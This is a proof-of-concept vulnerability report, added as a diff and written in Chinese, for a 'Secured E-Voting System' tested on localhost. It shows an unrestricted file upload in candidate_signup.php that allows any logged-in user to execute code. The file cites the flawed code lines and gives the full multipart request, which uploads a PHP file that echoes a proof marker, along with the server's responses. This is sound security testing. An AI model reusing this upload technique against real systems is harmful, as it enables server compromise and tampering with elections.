@@ -1,0 +1,54 @@
+F2 POC: Secured E-Voting System candidate_signup.php 任意文件上传→RCE（登录用户）
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+
+== 漏洞要点 ==
+candidate_signup.php:53-54: $file_ext = pathinfo($_FILES['candidate_photo']['name'], PATHINFO_EXTENSION)
+直接取客户端文件名扩展名，无白名单/无 getimagesize/无内容校验，
+:57 move_uploaded_file 写入 web 根下 uploadImage/Profile/candidate_<uid>_<time>.<ext>。
+入口仅要求登录（:7 只查 $_SESSION['user_id']，voter/candidate 皆可）。
+
+== 复现步骤与响应 ==
+[200] GET /candidate_signup
+    csrf=6f33c9073e50... positions=['5', '6']
+[200] POST /candidate_signup (candidate_photo=probe.php)
+    nomination_ok=True
+[0] (取证) SELECT candidates WHERE user_id=35
+    row=21	uploadImage/Profile/candidate_35_1794192314.php	pending
+[200] GET /uploadImage/Profile/candidate_35_1794192314.php
+    body=EVOTE-RCE2-PROOF-42
+[RCE-CONFIRMED] VERDICT
+    候选 id=21 status=pending（pending，供 F8 投票测试）
+
+== multipart 请求关键部分 ==
+POST /candidate_signup HTTP/1.1
+Host: 127.0.0.1:8138
+Cookie: PHPSESSID=<已验证会话>
+Content-Type: multipart/form-data; boundary=----X
+
+------X
+Content-Disposition: form-data; name="csrf_token"
+
+<页面token>
+------X
+Content-Disposition: form-data; name="position_id"
+
+5
+------X
+Content-Disposition: form-data; name="manifesto"
+
+POC nomination
+------X
+Content-Disposition: form-data; name="candidate_photo"; filename="probe.php"
+Content-Type: application/x-php
+
+<?php echo "EVOTE-RCE2-PROOF-".(6*7); ?>
+------X
+Content-Disposition: form-data; name="submit_nomination"
+
+1
+------X--
+
+payload: filename="probe.php"（扩展名 php 由客户端完全控制）
+落地文件: /uploadImage/Profile/candidate_35_1794192314.php
+执行结果: HTTP 200 body=EVOTE-RCE2-PROOF-42
+新候选人: id=21 status=pending
